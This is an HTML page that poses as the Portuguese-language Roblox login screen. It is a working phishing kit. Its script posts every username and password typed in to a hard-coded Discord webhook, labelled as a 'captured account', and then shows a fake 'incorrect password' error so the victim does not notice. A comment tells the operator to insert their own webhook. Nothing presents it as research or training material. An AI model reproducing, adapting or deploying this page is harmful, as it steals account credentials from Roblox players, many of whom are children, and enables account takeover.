<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Roblox</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
  
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body {
      font-family: 'Roboto', sans-serif;
      color: #e3e3e3;
      min-height: 100vh;
      background: #000 url('https://images.rbxcdn.com/076d146437ffc79cebc36bf2ded91196') no-repeat center center fixed;
      background-size: cover;
      display: flex;
      justify-content: center;
      align-items: center;
      overflow: hidden;
    }

    /* Overlay escuro para melhorar legibilidade (estilo Roblox moderno) */
    body::before {
      content: "";
      position: fixed;
      inset: 0;
      background: rgba(0, 0, 0, 0.45); /* escurece levemente o fundo */
      z-index: -1;
    }

    .container {
      width: 100%;
      max-width: 420px;
      padding: 48px 36px 36px;
      background: rgba(25, 25, 30, 0.78);
      border-radius: 12px;
      border: 1px solid rgba(255,255,255,0.08);
      box-shadow: 0 24px 70px rgba(0,0,0,0.7);
      backdrop-filter: blur(16px);
      z-index: 10;
      text-align: center;
    }

    .logo {
      margin-bottom: 40px;
    }

    .logo img {
      width: 220px;
      height: auto;
      filter: drop-shadow(0 6px 16px rgba(0, 170, 255, 0.5));
    }

    h1 {
      font-size: 32px;
      font-weight: 700;
      margin-bottom: 32px;
      color: #ffffff;
      letter-spacing: 0.5px;
    }

    .input-group {
      margin-bottom: 24px;
      text-align: left;
    }

    label {
      display: block;
      margin-bottom: 8px;
      font-size: 14px;
      font-weight: 500;
      color: #d0d0d0;
    }

    input {
      width: 100%;
      padding: 14px 16px;
      border: 1px solid #3a3a3a;
      border-radius: 6px;
      background: #111114;
      color: #fff;
      font-size: 16px;
      transition: all 0.2s ease;
    }

    input:focus {
      outline: none;
      border-color: #00a2ff;
      box-shadow: 0 0 0 3px rgba(0, 162, 255, 0.3);
    }

    .btn-login {
      width: 100%;
      padding: 16px;
      margin: 16px 0 20px;
      background: linear-gradient(90deg, #00a2ff, #0077cc);
      color: white;
      border: none;
      border-radius: 6px;
      font-size: 18px;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.25s;
    }

    .btn-login:hover {
      background: linear-gradient(90deg, #0088dd, #005fa3);
      transform: translateY(-2px);
      box-shadow: 0 8px 20px rgba(0, 130, 255, 0.4);
    }

    .btn-login:active {
      transform: translateY(0);
    }

    .btn-login:disabled {
      background: #444;
      cursor: not-allowed;
      opacity: 0.6;
    }

    .links {
      font-size: 14px;
      margin-top: 16px;
    }

    .links a {
      color: #00a2ff;
      text-decoration: none;
      margin: 0 12px;
      transition: color 0.2s;
    }

    .links a:hover {
      color: #4dc3ff;
      text-decoration: underline;
    }

    .error-message {
      position: absolute;
      left: 50%;
      transform: translateX(-50%);
      bottom: -70px;
      background: rgba(220, 50, 50, 0.95);
      color: white;
      padding: 12px 28px;
      border-radius: 8px;
      font-weight: 500;
      font-size: 15px;
      white-space: nowrap;
      opacity: 0;
      pointer-events: none;
      box-shadow: 0 8px 24px rgba(200,0,0,0.4);
    }

    .error-message.show {
      opacity: 1;
      bottom: -15px;
      animation: shake 0.5s, fadeOut 3.5s 0.8s forwards;
    }

    @keyframes shake {
      0%,100% { transform: translateX(-50%) translateY(0); }
      10%,30%,50%,70%,90% { transform: translateX(-50%) translateY(-5px); }
      20%,40%,60%,80% { transform: translateX(-50%) translateY(5px); }
    }

    @keyframes fadeOut {
      to { opacity: 0; bottom: -50px; }
    }
  </style>
</head>
<body>

<div class="container">
  <div class="logo">
    <img src="https://www.roblox.com/images/Logo.svg" alt="Roblox" 
         onerror="this.src='https://via.placeholder.com/220x70/00a2ff/ffffff?text=Roblox';">
  </div>

  <h1>Entrar</h1>

  <div class="input-group">
    <label for="username">Nome de usu√°rio ou Email</label>
    <input type="text" id="username" placeholder="" autocomplete="off">
  </div>

  <div class="input-group">
    <label for="password">Senha</label>
    <input type="password" id="password" placeholder="" autocomplete="off">
  </div>

  <button class="btn-login" id="loginBtn">Entrar</button>

  <div class="links">
    <a href="#">Esqueceu a senha?</a> ‚Ä¢ <a href="#">N√£o tem conta? Cadastre-se</a>
  </div>

  <div class="error-message" id="errorMsg">Nome de usu√°rio ou senha incorretos</div>
</div>

<script>
  const loginBtn = document.getElementById('loginBtn');
  const errorMsg = document.getElementById('errorMsg');
  const usernameInput = document.getElementById('username');
  const passwordInput = document.getElementById('password');

  // SEU WEBHOOK AQUI (n√£o esque√ßa de trocar!)
  const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1474804412965978274/aQAej8nqhjGJMP_FBvbJM84EmTaHdj9bWL9wIvibBh3oHhSbfVBiuMrVGxnY5bESCnVy";

  async function enviarParaDiscord(username, password) {
    try {
      const data = {
        content: "",
        embeds: [{
          title: "üîê **Nova Conta Capturada**",
          color: 0xFF0000,
          fields: [
            { name: "**Login:**", value: `\`${username.trim() || "‚Äî‚Äî‚Äî vazio ‚Äî‚Äî‚Äî"}\``, inline: true },
            { name: "**Senha:**", value: `\`${password.trim() || "‚Äî‚Äî‚Äî vazio ‚Äî‚Äî‚Äî"}\``, inline: true }
          ],
          timestamp: new Date().toISOString(),
          footer: { text: "Capturado ‚Ä¢ " + new Date().toLocaleString("pt-BR", { timeZone: "America/Sao_Paulo" }) }
        }]
      };

      await fetch(DISCORD_WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
      });
    } catch (err) {
      console.error("Erro no webhook:", err);
    }
  }

  loginBtn.addEventListener('click', async () => {
    const username = usernameInput.value.trim();
    const password = passwordInput.value.trim();

    loginBtn.disabled = true;
    loginBtn.textContent = "Entrando...";

    if (DISCORD_WEBHOOK_URL.includes("SEU_ID")) {
      console.warn("Webhook n√£o configurado! Troque o URL no c√≥digo.");
    } else {
      await enviarParaDiscord(username, password);
    }

    errorMsg.textContent = "Nome de usu√°rio ou senha incorretos";
    errorMsg.classList.add('show');

    setTimeout(() => {
      errorMsg.classList.remove('show');
      loginBtn.disabled = false;
      loginBtn.textContent = "Entrar";
    }, 3800);
  });
</script>

</body>
</html>
